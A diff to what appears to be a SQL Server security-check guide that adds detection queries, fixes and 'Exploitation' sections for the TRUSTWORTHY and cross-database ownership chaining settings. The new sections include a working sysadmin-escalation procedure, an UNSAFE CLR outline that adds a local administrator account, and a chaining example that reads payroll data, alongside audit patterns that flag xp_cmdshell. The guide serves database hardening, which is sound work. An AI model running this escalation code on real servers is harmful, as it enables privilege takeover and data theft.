@@ -582,64 +582,209 @@ ALTER DATABASE [DataWarehouse] SET AUTO_UPDATE_STATISTICS ON;
 ### B17 — Trustworthy Enabled on User Database
 
 **What it means**
-The TRUSTWORTHY database property allows modules (stored procedures, functions, assemblies) inside the database to impersonate server-level principals if the database owner is a member of `sysadmin`. An attacker who can write a stored procedure into a TRUSTWORTHY database owned by sa can escalate to sysadmin. It is required for cross-database Service Broker conversations and some EXTERNAL_ACCESS CLR assemblies.
+
+The `TRUSTWORTHY` property tells SQL Server to trust the contents of a database and allow modules inside it — stored procedures, functions, CLR assemblies — to step outside the database boundary and act with server-level authority, **provided the database owner is a member of `sysadmin`**.
+
+Normally, even an `EXECUTE AS OWNER` stored procedure is sandboxed to the current database. MS Learn confirms: "any attempt to access resources outside of the database will cause the statement to fail." TRUSTWORTHY lifts that sandbox. When it is ON and the owner is `sa` or another sysadmin member, database-level `db_owner` becomes a path to full server compromise.
+
+By default, TRUSTWORTHY is OFF on all user databases and is reset to OFF whenever a database is attached or restored.
 
 **How to spot it**
+
 ```sql
-SELECT name, is_trustworthy_on,
-       SUSER_SNAME(owner_sid) AS db_owner
+-- Highest-risk combination: TRUSTWORTHY ON + dbo is a sysadmin member
+SELECT d.name                          AS database_name,
+       SUSER_SNAME(d.owner_sid)        AS dbo_login,
+       d.is_trustworthy_on
+FROM sys.databases d
+WHERE d.is_trustworthy_on = 1
+  AND d.database_id <> 4              -- msdb is expected ON
+  AND IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)) = 1;
+
+-- All TRUSTWORTHY databases (even with non-sysadmin owner, still flag)
+SELECT name, is_trustworthy_on, SUSER_SNAME(owner_sid) AS dbo_login
 FROM sys.databases
 WHERE is_trustworthy_on = 1
-  AND database_id <> 4;  -- exclude msdb (expected ON)
--- Any user database → B17 fires
+  AND database_id <> 4;
 ```
 
-**Example (problem → fix)**
-```sql
--- Problem: AppDB has TRUSTWORTHY ON from an old Service Broker setup
--- that was decommissioned 2 years ago
+**Exploitation — Path 1: EXECUTE AS OWNER → sysadmin escalation**
 
--- Fix:
-ALTER DATABASE [AppDB] SET TRUSTWORTHY OFF;
--- Verify no Service Broker or EXTERNAL_ACCESS assemblies break
+This is the most common attack. The attacker holds `db_owner` in a TRUSTWORTHY database whose dbo is a `sysadmin` member (e.g. `sa`).
+
+```sql
+-- Precondition: AttackerLogin is db_owner in AppDB
+-- AppDB: TRUSTWORTHY ON, owned by sa
+
+USE AppDB;
+GO
+
+-- Attacker creates a proc that runs as the database OWNER (= sa)
+CREATE PROCEDURE usp_EscalatePrivilege
+WITH EXECUTE AS OWNER   -- OWNER resolves to sa — a sysadmin member
+                        -- TRUSTWORTHY allows this to carry server-level permissions
+AS
+BEGIN
+    -- Running as sa — full server authority now available
+    EXEC master..sp_addsrvrolemember 'AttackerLogin', 'sysadmin';
+END;
+GO
+
+EXEC usp_EscalatePrivilege;
+-- AttackerLogin is now sysadmin
+
+-- Verify:
+SELECT IS_SRVROLEMEMBER('sysadmin');  -- returns 1
+```
+
+MS Learn Policy-Based Management states directly: "There are ways to elevate a user with the `db_owner` role to become a `sysadmin` when setting `TRUSTWORTHY` to ON."
+
+**Exploitation — Path 2: Rogue database attach**
+
+TRUSTWORTHY is reset to OFF on attach — but an attacker with access to a `.mdf` file can prepare a malicious database and wait for an admin to re-enable TRUSTWORTHY for it.
+
+```sql
+-- Attacker steps (offline):
+-- 1. Obtain a copy of a database .mdf (from backup, stolen media, shared storage)
+-- 2. Attach it to a test instance
+-- 3. Add the malicious proc (usp_EscalatePrivilege above) to the database
+-- 4. Detach and deliver to target — TRUSTWORTHY is OFF after attach
+-- 5. Social-engineer admin into running: ALTER DATABASE [AppDB] SET TRUSTWORTHY ON
+-- 6. Attacker executes the proc → sysadmin
+
+-- Admin detection: always audit database contents before enabling TRUSTWORTHY post-attach
+SELECT o.name, o.type_desc, m.definition
+FROM sys.sql_modules m
+JOIN sys.objects o ON m.object_id = o.object_id
+WHERE m.definition LIKE '%EXECUTE AS%'
+   OR m.definition LIKE '%sp_addsrvrolemember%'
+   OR m.definition LIKE '%xp_cmdshell%';
+```
+
+MS Learn warns: "if the database is taken offline, if you have access to the database file you can potentially attach it to an instance of SQL Server of your choice and add malicious content to the database."
+
+**Exploitation — Path 3: UNSAFE CLR assembly (SQL 2016 and earlier)**
+
+When TRUSTWORTHY is ON and `clr strict security` is OFF (the default before SQL 2017), a `db_owner` whose database is owned by a sysadmin can load an UNSAFE CLR assembly — .NET code with no restrictions that can call OS functions, read files, and execute arbitrary commands.
+
+```sql
+-- SQL 2016 / clr strict security = 0:
+-- UNSAFE assemblies can call unmanaged code — arbitrary OS commands, file I/O, etc.
+CREATE ASSEMBLY MaliciousShell
+FROM 0x4D5A90...           -- compiled .NET DLL with [SqlProcedure] calling Process.Start
+WITH PERMISSION_SET = UNSAFE;
+-- UNSAFE requires: sysadmin, OR TRUSTWORTHY ON with sysadmin-owned dbo
+
+CREATE PROCEDURE usp_RunOsCommand (@cmd NVARCHAR(256))
+AS EXTERNAL NAME MaliciousShell.[MaliciousShell.ShellHelper].RunCommand;
+
+EXEC usp_RunOsCommand N'net user hacker P@ssword /add';
+EXEC usp_RunOsCommand N'net localgroup administrators hacker /add';
+```
+
+**SQL 2017+ mitigation:** `clr strict security = 1` (default ON) treats ALL assemblies as UNSAFE regardless of PERMISSION_SET — they must be signed and trusted via `sys.sp_add_trusted_assembly`. This closes Path 3 even when TRUSTWORTHY is ON. Verify:
+
+```sql
+SELECT name, value_in_use
+FROM sys.configurations
+WHERE name = 'clr strict security';
+-- value_in_use = 1 → Path 3 is mitigated
 ```
 
 **Fix options**
-1. Disable and test — most modern applications do not require TRUSTWORTHY
-2. If Service Broker requires it: tighten the database owner to a non-sysadmin account
-3. If CLR requires EXTERNAL_ACCESS: use certificate-based signing of assemblies instead
+1. `ALTER DATABASE [x] SET TRUSTWORTHY OFF` — this is safe for the vast majority of applications
+2. If Service Broker cross-database messaging requires it: change the database owner from `sa` to a non-sysadmin dedicated service account — TRUSTWORTHY can remain ON without escalation risk
+3. If CLR assemblies need EXTERNAL_ACCESS: use certificate-based signing (`CREATE CERTIFICATE` in both databases) — eliminates the TRUSTWORTHY dependency entirely
+4. Enable `clr strict security = 1` (SQL 2017+ default) as a defence-in-depth measure against Path 3
 
-**Related checks:** B18 (cross-DB chaining), B24 (CLR enabled)
+**Related checks:** B18 (cross-DB chaining — the other permission-bypass mechanism), B24 (CLR enabled), B27 (instance-level chaining)
 
 ---
 
 ### B18 — Cross-Database Ownership Chaining at Database Level
 
 **What it means**
-Cross-database ownership chaining allows a query in database A to access objects in database B without checking permissions on database B, as long as both databases are owned by the same principal and chaining is enabled on both. This bypasses the normal permission model and can allow unintended data access.
+
+SQL Server's **ownership chain** rule: when object A (a stored proc) calls object B (a table) and both are owned by the same principal, SQL Server skips the permission check on B. The caller only needs `EXECUTE` on A — they never need `SELECT` on B. This is the normal, safe, within-database behaviour.
+
+**Cross-database ownership chaining** extends this rule across database boundaries. When `DB_CHAINING` is ON in both the calling database and the target database, and both are owned by the same login, the permission check on the target database's objects is also skipped.
+
+This means: a user with `EXECUTE` on a stored proc in DB1 can read (or modify) data in DB2 without any explicit `SELECT` on DB2 objects, without being a user in DB2, and without the DBA being aware they have that access.
 
 **How to spot it**
+
 ```sql
-SELECT name, is_db_chaining_on
+-- Databases with per-database chaining enabled
+SELECT name, is_db_chaining_on,
+       SUSER_SNAME(owner_sid) AS dbo_login
 FROM sys.databases
 WHERE is_db_chaining_on = 1
-  AND database_id > 4;
+  AND database_id > 4;    -- skip system databases
+
+-- Instance-level chaining (overrides per-database setting for ALL databases)
+SELECT name, value_in_use AS chaining_enabled
+FROM sys.configurations
+WHERE name = 'cross db ownership chaining';
+-- value_in_use = 1 → all databases participate regardless of DB_CHAINING setting
 ```
 
-**Example (problem → fix)**
+**Exploitation — bypassing database-level permission isolation**
+
 ```sql
--- Problem: AppDB has chaining ON from a legacy 3-part-name view
--- that was replaced with a linked server 3 years ago
+-- Setup:
+-- SalesDB  (owned by sa, DB_CHAINING ON) contains usp_GetAllOrders
+-- PayrollDB (owned by sa, DB_CHAINING ON) contains dbo.Salaries (sensitive table)
+-- AttackerUser has db_datareader on SalesDB, zero permissions on PayrollDB
 
-ALTER DATABASE [AppDB] SET DB_CHAINING OFF;
+-- DBA creates a cross-database proc in SalesDB (legitimate historical code):
+USE SalesDB;
+GO
+CREATE PROCEDURE usp_GetAllOrders
+AS
+    SELECT * FROM SalesDB.dbo.Orders;
+    SELECT * FROM PayrollDB.dbo.Salaries;  -- cross-DB reference, same owner
+GO
+GRANT EXECUTE ON usp_GetAllOrders TO AttackerUser;
+
+-- Attacker runs:
+USE SalesDB;
+EXEC usp_GetAllOrders;
+-- Returns Salaries data from PayrollDB — no permission check was done on PayrollDB
+-- AttackerUser has never been granted any access to PayrollDB
 ```
+
+**Escalation with instance-level chaining (`sp_configure 'cross db ownership chaining', 1`)**
+
+When chaining is enabled at the instance level, **all** databases participate — including `master`, `msdb`, and `model`. MS Learn warns:
+
+> "A local database user with elevated privileges can exploit ownership chaining to escalate permissions and potentially gain **sysadmin** access."
+
+```sql
+-- With instance-level chaining ON, a db_owner in any database
+-- can chain through to msdb (TRUSTWORTHY ON by default) or master
+-- and execute administrative procedures if ownership chains align
+
+-- Audit: find proc definitions that reference cross-DB objects
+SELECT DB_NAME()        AS calling_db,
+       o.name           AS proc_name,
+       m.definition
+FROM sys.sql_modules m
+JOIN sys.objects o ON m.object_id = o.object_id
+WHERE m.definition LIKE '%[A-Za-z0-9_]%.[A-Za-z0-9_]%.[A-Za-z0-9_]%.[A-Za-z0-9_]%'  -- 4-part names
+   OR m.definition LIKE '%.dbo.%'                                                       -- cross-DB refs
+ORDER BY o.name;
+```
+
+**Important limitation of chaining (by design)**
+Cross-database chaining only works for **static SQL**. As soon as dynamic SQL (`EXEC (@sql)`) is introduced inside a chain, SQL Server breaks the chain and falls back to permission-checking the caller. This is a documented MS Learn behaviour: "Cross-database ownership chaining does not work in cases where dynamically created SQL statements are executed."
 
 **Fix options**
-1. Disable per-database chaining; also check instance-level chaining (B27)
-2. Replace cross-database views with schema-bound synonyms or explicit GRANT on cross-DB objects
-3. If chaining is genuinely required, document it and limit to the minimum databases needed
+1. `ALTER DATABASE [x] SET DB_CHAINING OFF` on all user databases (safe default)
+2. `EXEC sp_configure 'cross db ownership chaining', 0; RECONFIGURE;` — disables instance-wide (B27)
+3. Replace cross-database views and procs with explicit GRANTs: `GRANT SELECT ON [PayrollDB].[dbo].[Salaries] TO [SalesDB_AppUser]` — permission is visible, auditable, and intentional
+4. Use certificate-based signing to grant cross-database access through a signed proc — no ownership chain required and the permission is explicit
 
-**Related checks:** B27 (instance-level cross-DB chaining), B17 (Trustworthy)
+**Related checks:** B27 (instance-level cross-DB chaining — broader scope of the same risk), B17 (TRUSTWORTHY — the other database permission-boundary bypass)
 
 ---
 
